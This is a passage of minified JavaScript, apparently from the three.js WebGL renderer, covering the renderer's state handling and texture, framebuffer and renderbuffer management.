He(0,0,0),R=0,k=!1,X=null,te=null,P=null,z=null,W=null,re.set(0,0,i.canvas.width,i.canvas.height),pe.set(0,0,i.canvas.width,i.canvas.height),a.reset(),l.reset(),d.reset()}return{buffers:{color:a,depth:l,stencil:d},enable:Te,disable:ge,bindFramebuffer:Oe,drawBuffers:N,useProgram:nt,setBlending:fe,setMaterial:Ke,setFlipSided:Le,setCullFace:A,setLineWidth:S,setPolygonOffset:U,setScissorTest:J,activeTexture:Z,bindTexture:ee,unbindTexture:he,compressedTexImage2D:oe,compressedTexImage3D:ce,texImage2D:_e,texImage3D:de,updateUBOMapping:Qe,uniformBlockBinding:Ue,texStorage2D:ze,texStorage3D:Ae,texSubImage2D:ye,texSubImage3D:De,compressedTexSubImage2D:K,compressedTexSubImage3D:Ve,scissor:Pe,viewport:Ge,reset:ne}}function Hf(i,e,t,n,r,s,o){const a=r.isWebGL2,l=e.has("WEBGL_multisampled_render_to_texture")?e.get("WEBGL_multisampled_render_to_texture"):null,d=typeof navigator>"u"?!1:/OculusBrowser/g.test(navigator.userAgent),u=new WeakMap;let h;const p=new WeakMap;let m=!1;try{m=typeof OffscreenCanvas<"u"&&new OffscreenCanvas(1,1).getContext("2d")!==null}catch{}function E(A,S){return m?new OffscreenCanvas(A,S):Qi("canvas")}function x(A,S,U,J){let Z=1;if((A.width>J||A.height>J)&&(Z=J/Math.max(A.width,A.height)),Z<1||S===!0)if(typeof HTMLImageElement<"u"&&A instanceof HTMLImageElement||typeof HTMLCanvasElement<"u"&&A instanceof HTMLCanvasElement||typeof ImageBitmap<"u"&&A instanceof ImageBitmap){const ee=S?ts:Math.floor,he=ee(Z*A.width),oe=ee(Z*A.height);h===void 0&&(h=E(he,oe));const ce=U?E(he,oe):h;return ce.width=he,ce.height=oe,ce.getContext("2d").drawImage(A,0,0,he,oe),console.warn("THREE.WebGLRenderer: Texture has been resized from ("+A.width+"x"+A.height+") to ("+he+"x"+oe+")."),ce}else return"data"in A&&console.warn("THREE.WebGLRenderer: Image in DataTexture is too big ("+A.width+"x"+A.height+")."),A;return A}function f(A){return ta(A.width)&&ta(A.height)}function c(A){return a?!1:A.wrapS!==Ft||A.wrapT!==Ft||A.minFilter!==gt&&A.minFilter!==wt}function g(A,S){return A.generateMipmaps&&S&&A.minFilter!==gt&&A.minFilter!==wt}function _(A){i.generateMipmap(A)}function v(A,S,U,J,Z=!1){if(a===!1)return S;if(A!==null){if(i[A]!==void 0)return i[A];console.warn("THREE.WebGLRenderer: Attempt to use non-existing WebGL internal format '"+A+"'")}let ee=S;if(S===i.RED&&(U===i.FLOAT&&(ee=i.R32F),U===i.HALF_FLOAT&&(ee=i.R16F),U===i.UNSIGNED_BYTE&&(ee=i.R8)),S===i.RED_INTEGER&&(U===i.UNSIGNED_BYTE&&(ee=i.R8UI),U===i.UNSIGNED_SHORT&&(ee=i.R16UI),U===i.UNSIGNED_INT&&(ee=i.R32UI),U===i.BYTE&&(ee=i.R8I),U===i.SHORT&&(ee=i.R16I),U===i.INT&&(ee=i.R32I)),S===i.RG&&(U===i.FLOAT&&(ee=i.RG32F),U===i.HALF_FLOAT&&(ee=i.RG16F),U===i.UNSIGNED_BYTE&&(ee=i.RG8)),S===i.RGBA){const he=Z?ji:We.getTransfer(J);U===i.FLOAT&&(ee=i.RGBA32F),U===i.HALF_FLOAT&&(ee=i.RGBA16F),U===i.UNSIGNED_BYTE&&(ee=he===je?i.SRGB8_ALPHA8:i.RGBA8),U===i.UNSIGNED_SHORT_4_4_4_4&&(ee=i.RGBA4),U===i.UNSIGNED_SHORT_5_5_5_1&&(ee=i.RGB5_A1)}return(ee===i.R16F||ee===i.R32F||ee===i.RG16F||ee===i.RG32F||ee===i.RGBA16F||ee===i.RGBA32F)&&e.get("EXT_color_buffer_float"),ee}function w(A,S,U){return g(A,U)===!0||A.isFramebufferTexture&&A.minFilter!==gt&&A.minFilter!==wt?Math.log2(Math.max(S.width,S.height))+1:A.mipmaps!==void 0&&A.mipmaps.length>0?A.mipmaps.length:A.isCompressedTexture&&Array.isArray(A.image)?S.mipmaps.length:1}function M(A){return A===gt||A===As||A===dr?i.NEAREST:i.LINEAR}function T(A){const S=A.target;S.removeEventListener("dispose",T),y(S),S.isVideoTexture&&u.delete(S)}function D(A){const S=A.target;S.removeEventListener("dispose",D),k(S)}function y(A){const S=n.get(A);if(S.__webglInit===void 0)return;const U=A.source,J=p.get(U);if(J){const Z=J[S.__cacheKey];Z.usedTimes--,Z.usedTimes===0&&R(A),Object.keys(J).length===0&&p.delete(U)}n.remove(A)}function R(A){const S=n.get(A);i.deleteTexture(S.__webglTexture);const U=A.source,J=p.get(U);delete J[S.__cacheKey],o.memory.textures--}function k(A){const S=A.texture,U=n.get(A),J=n.get(S);if(J.__webglTexture!==void 0&&(i.deleteTexture(J.__webglTexture),o.memory.textures--),A.depthTexture&&A.depthTexture.dispose(),A.isWebGLCubeRenderTarget)for(let Z=0;Z<6;Z++){if(Array.isArray(U.__webglFramebuffer[Z]))for(let ee=0;ee<U.__webglFramebuffer[Z].length;ee++)i.deleteFramebuffer(U.__webglFramebuffer[Z][ee]);else i.deleteFramebuffer(U.__webglFramebuffer[Z]);U.__webglDepthbuffer&&i.deleteRenderbuffer(U.__webglDepthbuffer[Z])}else{if(Array.isArray(U.__webglFramebuffer))for(let Z=0;Z<U.__webglFramebuffer.length;Z++)i.deleteFramebuffer(U.__webglFramebuffer[Z]);else i.deleteFramebuffer(U.__webglFramebuffer);if(U.__webglDepthbuffer&&i.deleteRenderbuffer(U.__webglDepthbuffer),U.__webglMultisampledFramebuffer&&i.deleteFramebuffer(U.__webglMultisampledFramebuffer),U.__webglColorRenderbuffer)for(let Z=0;Z<U.__webglColorRenderbuffer.length;Z++)U.__webglColorRenderbuffer[Z]&&i.deleteRenderbuffer(U.__webglColorRenderbuffer[Z]);U.__webglDepthRenderbuffer&&i.deleteRenderbuffer(U.__webglDepthRenderbuffer)}if(A.isWebGLMultipleRenderTargets)for(let Z=0,ee=S.length;Z<ee;Z++){const he=n.get(S[Z]);he.__webglTexture&&(i.deleteTexture(he.__webglTexture),o.memory.textures--),n.remove(S[Z])}n.remove(S),n.remove(A)}let X=0;function te(){X=0}function P(){const A=X;return A>=r.maxTextures&&console.warn("THREE.WebGLTextures: Trying to use "+A+" texture units while this GPU supports only "+r.maxTextures),X+=1,A}function z(A){const S=[];return S.push(A.wrapS),S.push(A.wrapT),S.push(A.wrapR||0),S.push(A.magFilter),S.push(A.minFilter),S.push(A.anisotropy),S.push(A.internalFormat),S.push(A.format),S.push(A.type),S.push(A.generateMipmaps),S.push(A.premultiplyAlpha),S.push(A.flipY),S.push(A.unpackAlignment),S.push(A.colorSpace),S.join()}function W(A,S){const U=n.get(A);if(A.isVideoTexture&&Ke(A),A.isRenderTargetTexture===!1&&A.version>0&&U.__version!==A.version){const J=A.image;if(J===null)console.warn("THREE.WebGLRenderer: Texture marked for update but no image data found.");else if(J.complete===!1)console.warn("THREE.WebGLRenderer: Texture marked for update but image is incomplete");else{re(U,A,S);return}}t.bindTexture(i.TEXTURE_2D,U.__webglTexture,i.TEXTURE0+S)}function Y(A,S){const U=n.get(A);if(A.version>0&&U.__version!==A.version){re(U,A,S);return}t.bindTexture(i.TEXTURE_2D_ARRAY,U.__webglTexture,i.TEXTURE0+S)}function H(A,S){const U=n.get(A);if(A.version>0&&U.__version!==A.version){re(U,A,S);return}t.bindTexture(i.TEXTURE_3D,U.__webglTexture,i.TEXTURE0+S)}function V(A,S){const U=n.get(A);if(A.version>0&&U.__version!==A.version){pe(U,A,S);return}t.bindTexture(i.TEXTURE_CUBE_MAP,U.__webglTexture,i.TEXTURE0+S)}const q={[Zr]:i.REPEAT,[Ft]:i.CLAMP_TO_EDGE,[Qr]:i.MIRRORED_REPEAT},Q={[gt]:i.NEAREST,[As]:i.NEAREST_MIPMAP_NEAREST,[dr]:i.NEAREST_MIPMAP_LINEAR,[wt]:i.LINEAR,[yl]:i.LINEAR_MIPMAP_NEAREST,[fi]:i.LINEAR_MIPMAP_LINEAR},$={[Nl]:i.NEVER,[Bl]:i.ALWAYS,[Ol]:i.LESS,[po]:i.LEQUAL,[Ul]:i.EQUAL,[zl]:i.GEQUAL,[Fl]:i.GREATER,[kl]:i.NOTEQUAL};function G(A,S,U){if(U?(i.texParameteri(A,i.TEXTURE_WRAP_S,q[S.wrapS]),i.texParameteri(A,i.TEXTURE_WRAP_T,q[S.wrapT]),(A===i.TEXTURE_3D||A===i.TEXTURE_2D_ARRAY)&&i.texParameteri(A,i.TEXTURE_WRAP_R,q[S.wrapR]),i.texParameteri(A,i.TEXTURE_MAG_FILTER,Q[S.magFilter]),i.texParameteri(A,i.TEXTURE_MIN_FILTER,Q[S.minFilter])):(i.texParameteri(A,i.TEXTURE_WRAP_S,i.CLAMP_TO_EDGE),i.texParameteri(A,i.TEXTURE_WRAP_T,i.CLAMP_TO_EDGE),(A===i.TEXTURE_3D||A===i.TEXTURE_2D_ARRAY)&&i.texParameteri(A,i.TEXTURE_WRAP_R,i.CLAMP_TO_EDGE),(S.wrapS!==Ft||S.wrapT!==Ft)&&console.warn("THREE.WebGLRenderer: Texture is not power of two. Texture.wrapS and Texture.wrapT should be set to THREE.ClampToEdgeWrapping."),i.texParameteri(A,i.TEXTURE_MAG_FILTER,M(S.magFilter)),i.texParameteri(A,i.TEXTURE_MIN_FILTER,M(S.minFilter)),S.minFilter!==gt&&S.minFilter!==wt&&console.warn("THREE.WebGLRenderer: Texture is not power of two. Texture.minFilter should be set to THREE.NearestFilter or THREE.LinearFilter.")),S.compareFunction&&(i.texParameteri(A,i.TEXTURE_COMPARE_MODE,i.COMPARE_REF_TO_TEXTURE),i.texParameteri(A,i.TEXTURE_COMPARE_FUNC,$[S.compareFunction])),e.has("EXT_texture_filter_anisotropic")===!0){const J=e.get("EXT_texture_filter_anisotropic");if(S.magFilter===gt||S.minFilter!==dr&&S.minFilter!==fi||S.type===sn&&e.has("OES_texture_float_linear")===!1||a===!1&&S.type===hi&&e.has("OES_texture_half_float_linear")===!1)return;(S.anisotropy>1||n.get(S).__currentAnisotropy)&&(i.texParameterf(A,J.TEXTURE_MAX_ANISOTROPY_EXT,Math.min(S.anisotropy,r.getMaxAnisotropy())),n.get(S).__currentAnisotropy=S.anisotropy)}}function j(A,S){let U=!1;A.__webglInit===void 0&&(A.__webglInit=!0,S.addEventListener("dispose",T));const J=S.source;let Z=p.get(J);Z===void 0&&(Z={},p.set(J,Z));const ee=z(S);if(ee!==A.__cacheKey){Z[ee]===void 0&&(Z[ee]={texture:i.createTexture(),usedTimes:0},o.memory.textures++,U=!0),Z[ee].usedTimes++;const he=Z[A.__cacheKey];he!==void 0&&(Z[A.__cacheKey].usedTimes--,he.usedTimes===0&&R(S)),A.__cacheKey=ee,A.__webglTexture=Z[ee].texture}return U}function re(A,S,U){let J=i.TEXTURE_2D;(S.isDataArrayTexture||S.isCompressedArrayTexture)&&(J=i.TEXTURE_2D_ARRAY),S.isData3DTexture&&(J=i.TEXTURE_3D);const Z=j(A,S),ee=S.source;t.bindTexture(J,A.__webglTexture,i.TEXTURE0+U);const he=n.get(ee);if(ee.version!==he.__version||Z===!0){t.activeTexture(i.TEXTURE0+U);const oe=We.getPrimaries(We.workingColorSpace),ce=S.colorSpace===Pt?null:We.getPrimaries(S.colorSpace),ye=S.colorSpace===Pt||oe===ce?i.NONE:i.BROWSER_DEFAULT_WEBGL;i.pixelStorei(i.UNPACK_FLIP_Y_WEBGL,S.flipY),i.pixelStorei(i.UNPACK_PREMULTIPLY_ALPHA_WEBGL,S.premultiplyAlpha),i.pixelStorei(i.UNPACK_ALIGNMENT,S.unpackAlignment),i.pixelStorei(i.UNPACK_COLORSPACE_CONVERSION_WEBGL,ye);const De=c(S)&&f(S.image)===!1;let K=x(S.image,De,!1,r.maxTextureSize);K=Le(S,K);const Ve=f(K)||a,ze=s.convert(S.format,S.colorSpace);let Ae=s.convert(S.type),_e=v(S.internalFormat,ze,Ae,S.colorSpace,S.isVideoTexture);G(J,S,Ve);let de;const Pe=S.mipmaps,Ge=a&&S.isVideoTexture!==!0&&_e!==co,Qe=he.__version===void 0||Z===!0,Ue=w(S,K,Ve);if(S.isDepthTexture)_e=i.DEPTH_COMPONENT,a?S.type===sn?_e=i.DEPTH_COMPONENT32F:S.type===rn?_e=i.DEPTH_COMPONENT24:S.type===yn?_e=i.DEPTH24_STENCIL8:_e=i.DEPTH_COMPONENT16:S.type===sn&&console.error("WebGLRenderer: Floating point depth texture requires WebGL2."),S.format===Sn&&_e===i.DEPTH_COMPONENT&&S.type!==as&&S.type!==rn&&(console.warn("THREE.WebGLRenderer: Use UnsignedShortType or UnsignedIntType for DepthFormat DepthTexture."),S.type=rn,Ae=s.convert(S.type)),S.format===Zn&&_e===i.DEPTH_COMPONENT&&(_e=i.DEPTH_STENCIL,S.type!==yn&&(console.warn("THREE.WebGLRenderer: Use UnsignedInt248Type for DepthStencilFormat DepthTexture."),S.type=yn,Ae=s.convert(S.type))),Qe&&(Ge?t.texStorage2D(i.TEXTURE_2D,1,_e,K.width,K.height):t.texImage2D(i.TEXTURE_2D,0,_e,K.width,K.height,0,ze,Ae,null));else if(S.isDataTexture)if(Pe.length>0&&Ve){Ge&&Qe&&t.texStorage2D(i.TEXTURE_2D,Ue,_e,Pe[0].width,Pe[0].height);for(let ne=0,C=Pe.length;ne<C;ne++)de=Pe[ne],Ge?t.texSubImage2D(i.TEXTURE_2D,ne,0,0,de.width,de.height,ze,Ae,de.data):t.texImage2D(i.TEXTURE_2D,ne,_e,de.width,de.height,0,ze,Ae,de.data);S.generateMipmaps=!1}else Ge?(Qe&&t.texStorage2D(i.TEXTURE_2D,Ue,_e,K.width,K.height),t.texSubImage2D(i.TEXTURE_2D,0,0,0,K.width,K.height,ze,Ae,K.data)):t.texImage2D(i.TEXTURE_2D,0,_e,K.width,K.height,0,ze,Ae,K.data);else if(S.isCompressedTexture)if(S.isCompressedArrayTexture){Ge&&Qe&&t.texStorage3D(i.TEXTURE_2D_ARRAY,Ue,_e,Pe[0].width,Pe[0].height,K.depth);for(let ne=0,C=Pe.length;ne<C;ne++)de=Pe[ne],S.format!==kt?ze!==null?Ge?t.compressedTexSubImage3D(i.TEXTURE_2D_ARRAY,ne,0,0,0,de.width,de.height,K.depth,ze,de.data,0,0):t.compressedTexImage3D(i.TEXTURE_2D_ARRAY,ne,_e,de.width,de.height,K.depth,0,de.data,0,0):console.warn("THREE.WebGLRenderer: Attempt to load unsupported compressed texture format in .uploadTexture()"):Ge?t.texSubImage3D(i.TEXTURE_2D_ARRAY,ne,0,0,0,de.width,de.height,K.depth,ze,Ae,de.data):t.texImage3D(i.TEXTURE_2D_ARRAY,ne,_e,de.width,de.height,K.depth,0,ze,Ae,de.data)}else{Ge&&Qe&&t.texStorage2D(i.TEXTURE_2D,Ue,_e,Pe[0].width,Pe[0].height);for(let ne=0,C=Pe.length;ne<C;ne++)de=Pe[ne],S.format!==kt?ze!==null?Ge?t.compressedTexSubImage2D(i.TEXTURE_2D,ne,0,0,de.width,de.height,ze,de.data):t.compressedTexImage2D(i.TEXTURE_2D,ne,_e,de.width,de.height,0,de.data):console.warn("THREE.WebGLRenderer: Attempt to load unsupported compressed texture format in .uploadTexture()"):Ge?t.texSubImage2D(i.TEXTURE_2D,ne,0,0,de.width,de.height,ze,Ae,de.data):t.texImage2D(i.TEXTURE_2D,ne,_e,de.width,de.height,0,ze,Ae,de.data)}else if(S.isDataArrayTexture)Ge?(Qe&&t.texStorage3D(i.TEXTURE_2D_ARRAY,Ue,_e,K.width,K.height,K.depth),t.texSubImage3D(i.TEXTURE_2D_ARRAY,0,0,0,0,K.width,K.height,K.depth,ze,Ae,K.data)):t.texImage3D(i.TEXTURE_2D_ARRAY,0,_e,K.width,K.height,K.depth,0,ze,Ae,K.data);else if(S.isData3DTexture)Ge?(Qe&&t.texStorage3D(i.TEXTURE_3D,Ue,_e,K.width,K.height,K.depth),t.texSubImage3D(i.TEXTURE_3D,0,0,0,0,K.width,K.height,K.depth,ze,Ae,K.data)):t.texImage3D(i.TEXTURE_3D,0,_e,K.width,K.height,K.depth,0,ze,Ae,K.data);else if(S.isFramebufferTexture){if(Qe)if(Ge)t.texStorage2D(i.TEXTURE_2D,Ue,_e,K.width,K.height);else{let ne=K.width,C=K.height;for(let se=0;se<Ue;se++)t.texImage2D(i.TEXTURE_2D,se,_e,ne,C,0,ze,Ae,null),ne>>=1,C>>=1}}else if(Pe.length>0&&Ve){Ge&&Qe&&t.texStorage2D(i.TEXTURE_2D,Ue,_e,Pe[0].width,Pe[0].height);for(let ne=0,C=Pe.length;ne<C;ne++)de=Pe[ne],Ge?t.texSubImage2D(i.TEXTURE_2D,ne,0,0,ze,Ae,de):t.texImage2D(i.TEXTURE_2D,ne,_e,ze,Ae,de);S.generateMipmaps=!1}else Ge?(Qe&&t.texStorage2D(i.TEXTURE_2D,Ue,_e,K.width,K.height),t.texSubImage2D(i.TEXTURE_2D,0,0,0,ze,Ae,K)):t.texImage2D(i.TEXTURE_2D,0,_e,ze,Ae,K);g(S,Ve)&&_(J),he.__version=ee.version,S.onUpdate&&S.onUpdate(S)}A.__version=S.version}function pe(A,S,U){if(S.image.length!==6)return;const J=j(A,S),Z=S.source;t.bindTexture(i.TEXTURE_CUBE_MAP,A.__webglTexture,i.TEXTURE0+U);const ee=n.get(Z);if(Z.version!==ee.__version||J===!0){t.activeTexture(i.TEXTURE0+U);const he=We.getPrimaries(We.workingColorSpace),oe=S.colorSpace===Pt?null:We.getPrimaries(S.colorSpace),ce=S.colorSpace===Pt||he===oe?i.NONE:i.BROWSER_DEFAULT_WEBGL;i.pixelStorei(i.UNPACK_FLIP_Y_WEBGL,S.flipY),i.pixelStorei(i.UNPACK_PREMULTIPLY_ALPHA_WEBGL,S.premultiplyAlpha),i.pixelStorei(i.UNPACK_ALIGNMENT,S.unpackAlignment),i.pixelStorei(i.UNPACK_COLORSPACE_CONVERSION_WEBGL,ce);const ye=S.isCompressedTexture||S.image[0].isCompressedTexture,De=S.image[0]&&S.image[0].isDataTexture,K=[];for(let ne=0;ne<6;ne++)!ye&&!De?K[ne]=x(S.image[ne],!1,!0,r.maxCubemapSize):K[ne]=De?S.image[ne].image:S.image[ne],K[ne]=Le(S,K[ne]);const Ve=K[0],ze=f(Ve)||a,Ae=s.convert(S.format,S.colorSpace),_e=s.convert(S.type),de=v(S.internalFormat,Ae,_e,S.colorSpace),Pe=a&&S.isVideoTexture!==!0,Ge=ee.__version===void 0||J===!0;let Qe=w(S,Ve,ze);G(i.TEXTURE_CUBE_MAP,S,ze);let Ue;if(ye){Pe&&Ge&&t.texStorage2D(i.TEXTURE_CUBE_MAP,Qe,de,Ve.width,Ve.height);for(let ne=0;ne<6;ne++){Ue=K[ne].mipmaps;for(let C=0;C<Ue.length;C++){const se=Ue[C];S.format!==kt?Ae!==null?Pe?t.compressedTexSubImage2D(i.TEXTURE_CUBE_MAP_POSITIVE_X+ne,C,0,0,se.width,se.height,Ae,se.data):t.compressedTexImage2D(i.TEXTURE_CUBE_MAP_POSITIVE_X+ne,C,de,se.width,se.height,0,se.data):console.warn("THREE.WebGLRenderer: Attempt to load unsupported compressed texture format in .setTextureCube()"):Pe?t.texSubImage2D(i.TEXTURE_CUBE_MAP_POSITIVE_X+ne,C,0,0,se.width,se.height,Ae,_e,se.data):t.texImage2D(i.TEXTURE_CUBE_MAP_POSITIVE_X+ne,C,de,se.width,se.height,0,Ae,_e,se.data)}}}else{Ue=S.mipmaps,Pe&&Ge&&(Ue.length>0&&Qe++,t.texStorage2D(i.TEXTURE_CUBE_MAP,Qe,de,K[0].width,K[0].height));for(let ne=0;ne<6;ne++)if(De){Pe?t.texSubImage2D(i.TEXTURE_CUBE_MAP_POSITIVE_X+ne,0,0,0,K[ne].width,K[ne].height,Ae,_e,K[ne].data):t.texImage2D(i.TEXTURE_CUBE_MAP_POSITIVE_X+ne,0,de,K[ne].width,K[ne].height,0,Ae,_e,K[ne].data);for(let C=0;C<Ue.length;C++){const ae=Ue[C].image[ne].image;Pe?t.texSubImage2D(i.TEXTURE_CUBE_MAP_POSITIVE_X+ne,C+1,0,0,ae.width,ae.height,Ae,_e,ae.data):t.texImage2D(i.TEXTURE_CUBE_MAP_POSITIVE_X+ne,C+1,de,ae.width,ae.height,0,Ae,_e,ae.data)}}else{Pe?t.texSubImage2D(i.TEXTURE_CUBE_MAP_POSITIVE_X+ne,0,0,0,Ae,_e,K[ne]):t.texImage2D(i.TEXTURE_CUBE_MAP_POSITIVE_X+ne,0,de,Ae,_e,K[ne]);for(let C=0;C<Ue.length;C++){const se=Ue[C];Pe?t.texSubImage2D(i.TEXTURE_CUBE_MAP_POSITIVE_X+ne,C+1,0,0,Ae,_e,se.image[ne]):t.texImage2D(i.TEXTURE_CUBE_MAP_POSITIVE_X+ne,C+1,de,Ae,_e,se.image[ne])}}}g(S,ze)&&_(i.TEXTURE_CUBE_MAP),ee.__version=Z.version,S.onUpdate&&S.onUpdate(S)}A.__version=S.version}function ue(A,S,U,J,Z,ee){const he=s.convert(U.format,U.colorSpace),oe=s.convert(U.type),ce=v(U.internalFormat,he,oe,U.colorSpace);if(!n.get(S).__hasExternalTextures){const De=Math.max(1,S.width>>ee),K=Math.max(1,S.height>>ee);Z===i.TEXTURE_3D||Z===i.TEXTURE_2D_ARRAY?t.texImage3D(Z,ee,ce,De,K,S.depth,0,he,oe,null):t.texImage2D(Z,ee,ce,De,K,0,he,oe,null)}t.bindFramebuffer(i.FRAMEBUFFER,A),fe(S)?l.framebufferTexture2DMultisampleEXT(i.FRAMEBUFFER,J,Z,n.get(U).__webglTexture,0,Re(S)):(Z===i.TEXTURE_2D||Z>=i.TEXTURE_CUBE_MAP_POSITIVE_X&&Z<=i.TEXTURE_CUBE_MAP_NEGATIVE_Z)&&i.framebufferTexture2D(i.FRAMEBUFFER,J,Z,n.get(U).__webglTexture,ee),t.bindFramebuffer(i.FRAMEBUFFER,null)}function Me(A,S,U){if(i.bindRenderbuffer(i.RENDERBUFFER,A),S.depthBuffer&&!S.stencilBuffer){let J=a===!0?i.DEPTH_COMPONENT24:i.DEPTH_COMPONENT16;if(U||fe(S)){const Z=S.depthTexture;Z&&Z.isDepthTexture&&(Z.type===sn?J=i.DEPTH_COMPONENT32F:Z.type===rn&&(J=i.DEPTH_COMPONENT24));const ee=Re(S);fe(S)?l.renderbufferStorageMultisampleEXT(i.RENDERBUFFER,ee,J,S.width,S.height):i.renderbufferStorageMultisample(i.RENDERBUFFER,ee,J,S.width,S.height)}else i.renderbufferStorage(i.RENDERBUFFER,J,S.width,S.height);i.framebufferRenderbuffer(i.FRAMEBUFFER,i.DEPTH_ATTACHMENT,i.RENDERBUFFER,A)}else if(S.depthBuffer&&S.stencilBuffer){const J=Re(S);U&&fe(S)===!1?i.renderbufferStorageMultisample(i.RENDERBUFFER,J,i.DEPTH24_STENCIL8,S.width,S.height):fe(S)?l.renderbufferStorageMultisampleEXT(i.RENDERBUFFER,J,i.DEPTH24_STENCIL8,S.width,S.height):i.renderbufferStorage(i.RENDERBUFFER,i.DEPTH_STENCIL,S.width,S.height),i.framebufferRenderbuffer(i.FRAMEBUFFER,i.DEPTH_STENCIL_ATTACHMENT,i.RENDERBUFFER,A)}else{const J=S.isWebGLMultipleRenderTargets===!0?S.texture:[S.texture];for(let Z=0;Z<J.length;Z++){const ee=J[Z],he=s.convert(ee.format,ee.colorSpace),oe=s.convert(ee.type),ce=v(ee.internalFormat,he,oe,ee.colorSpace),ye=Re(S);U&&fe(S)===!1?i.renderbufferStorageMultisample(i.RENDERBUFFER,ye,ce,S.width,S.height):fe(S)?l.renderbufferStorageMultisampleEXT(i.RENDERBUFFER,ye,ce,S.width,S.height):i.renderbufferStorage(i.RENDERBUFFER,ce,S.width,S.height)}}i.bindRenderbuffer(i.RENDERBUFFER,null)}function Te(A,S){if(S&&S.isWebGLCubeRenderTarget)throw new Error("Depth Texture with cube render targets is not supported");if(t.bindFramebuffer(i.FRAMEBUFFER,A),!(S.depthTexture&&S.depthTexture.isDepthTexture))throw new Error("renderTarget.depthTexture must be an instance of THREE.DepthTexture");(!n.get(S.depthTexture).__webglTexture||S.depthTexture.image.width!==S.width||S.depthTexture.image.height!==S.height)&&(S.depthTexture.image.width=S.width,S.depthTexture.image.height=S.height,S.depthTexture.needsUpdate=!0),W(S.depthTexture,0);const J=n.get(S.depthTexture).__webglTexture,Z=Re(S);if(S.depthTexture.format===Sn)fe(S)?l.framebufferTexture2DMultisampleEXT(i.FRAMEBUFFER,i.DEPTH_ATTACHMENT,i.TEXTURE_2D,J,0,Z):i.framebufferTexture2D(i.FRAMEBUFFER,i.DEPTH_ATTACHMENT,i.TEXTURE_2D,J,0);else if(S.depthTexture.format===Zn)fe(S)?l.framebufferTexture2DMultisampleEXT(i.FRAMEBUFFER,i.DEPTH_STENCIL_ATTACHMENT,i.TEXTURE_2D,J,0,Z):i.framebufferTexture2D(i.FRAMEBUFFER,i.DEPTH_STENCIL_ATTACHMENT,i.TEXTURE_2D,J,0);else throw new Error("Unknown depthTexture format")}function ge(A){const S=n.get(A),U=A.isWebGLCubeRenderTarget===!0;if(A.depthTexture&&!S.__autoAllocateDepthBuffer){if(U)throw new Error("target.depthTexture not supported in Cube render targets");Te(S.__webglFramebuffer,A)}else if(U){S.__webglDepthbuffer=[];for(let J=0;J<6;J++)t.bindFramebuffer(i.FRAMEBUFFER,S.__webglFramebuffer[J]),S.__webglDepthbuffer[J]=i.createRenderbuffer(),Me(S.__webglDepthbuffer[J],A,!1)}else t.bindFramebuffer(i.FRAMEBUFFER,S.__webglFramebuffer),S.__webglDepthbuffer=i.createRenderbuffer(),Me(S.__webglDepthbuffer,A,!1);t.bindFramebuffer(i.FRAMEBUFFER,null)}function Oe(A,S,U){const J=n.get(A);S!==void 0&&ue(J.__webglFramebuffer,A,A.texture,i.COLOR_ATTACHMENT0,i.TEXTURE_2D,0),U!==void 0&&ge(A)}function N(A){const S=A.texture,U=n.get(A),J=n.get(S);A.addEventListener("dispose",D),A.isWebGLMultipleRenderTargets!==!0&&(J.__webglTexture===void 0&&(J.__webglTexture=i.createTexture()),J.__version=S.version,o.memory.textures++);const Z=A.isWebGLCubeRenderTarget===!0,ee=A.isWebGLMultipleRenderTargets===!0,he=f(A)||a;if(Z){U.__webglFramebuffer=[];for(let oe=0;oe<6;oe++)if(a&&S.mipmaps&&S.mipmaps.length>0){U.__webglFramebuffer[oe]=[];for(let ce=0;ce<S.mipmaps.length;ce++)U.__webglFramebuffer[oe][ce]=i.createFramebuffer()}else U.__webglFramebuffer[oe]=i.createFramebuffer()}else{if(a&&S.mipmaps&&S.mipmaps.length>0){U.__webglFramebuffer=[];for(let oe=0;oe<S.mipmaps.length;oe++)U.__webglFramebuffer[oe]=i.createFramebuffer()}else U.__webglFramebuffer=i.createFramebuffer();if(ee)if(r.drawBuffers){const oe=A.texture;for(let ce=0,ye=oe.length;ce<ye;ce++){const De=n.get(oe[ce]);De.__webglTexture===void 0&&(De.__webglTexture=i.createTexture(),o.memory.textures++)}}else console.warn("THREE.WebGLRenderer: WebGLMultipleRenderTargets can only be used with WebGL2 or WEBGL_draw_buffers extension.");if(a&&A.samples>0&&fe(A)===!1){const oe=ee?S:[S];U.__webglMultisampledFramebuffer=i.createFramebuffer(),U.__webglColorRenderbuffer=[],t.bindFramebuffer(i.FRAMEBUFFER,U.__webglMultisampledFramebuffer);for(let ce=0;ce<oe.length;ce++){const ye=oe[ce];U.__webglColorRenderbuffer[ce]=i.createRenderbuffer(),i.bindRenderbuffer(i.RENDERBUFFER,U.__webglColorRenderbuffer[ce]);const De=s.convert(ye.format,ye.colorSpace),K=s.convert(ye.type),Ve=v(ye.internalFormat,De,K,ye.colorSpace,A.isXRRenderTarget===!0),ze=Re(A);i.renderbufferStorageMultisample(i.RENDERBUFFER,ze,Ve,A.width,A.height),i.framebufferRenderbuffer(i.FRAMEBUFFER,i.COLOR_ATTACHMENT0+ce,i.RENDERBUFFER,U.__webglColorRenderbuffer[ce])}i.bindRenderbuffer(i.RENDERBUFFER,null),A.depthBuffer&&(U.__webglDepthRenderbuffer=i.createRenderbuffer(),Me(U.__webglDepthRenderbuffer,A,!0)),t.bindFramebuffer(i.FRAMEBUFFER,null)}}if(Z){t.bindTexture(i.TEXTURE_CUBE_MAP,J.__webglTexture),G(i.TEXTURE_CUBE_MAP,S,he);for(let oe=0;oe<6;oe++)if(a&&S.mipmaps&&S.mipmaps.length>0)for(let ce=0;ce<S.mipmaps.length;ce++)ue(U.__webglFramebuffer[oe][ce],A,S,i.COLOR_ATTACHMENT0,i.TEXTURE_CUBE_MAP_POSITIVE_X+oe,ce);else ue(U.__webglFramebuffer[oe],A,S,i.COLOR_ATTACHMENT0,i.TEXTURE_CUBE_MAP_POSITIVE_X+oe,0);g(S,he)&&_(i.TEXTURE_CUBE_MAP),t.unbindTexture()}else if(ee){const oe=A.texture;for(let ce=0,ye=oe.length;ce<ye;ce++){const De=oe[ce],K=n.get(De);t.bindTexture(i.TEXTURE_2D,K.__webglTexture),G(i.TEXTURE_2D,De,he),ue(U.__webglFramebuffer,A,De,i.COLOR_ATTACHMENT0+ce,i.TEXTURE_2D,0),g(De,he)&&_(i.TEXTURE_2D)}t.unbindTexture()}else{let oe=i.TEXTURE_2D;if((A.isWebGL3DRenderTarget||A.isWebGLArrayRenderTarget)&&(a?oe=A.isWebGL3DRenderTarget?i.TEXTURE_3D:i.TEXTURE_2D_ARRAY:console.error("THREE.WebGLTextures: THREE.Data3DTexture and THREE.DataArrayTexture only supported with 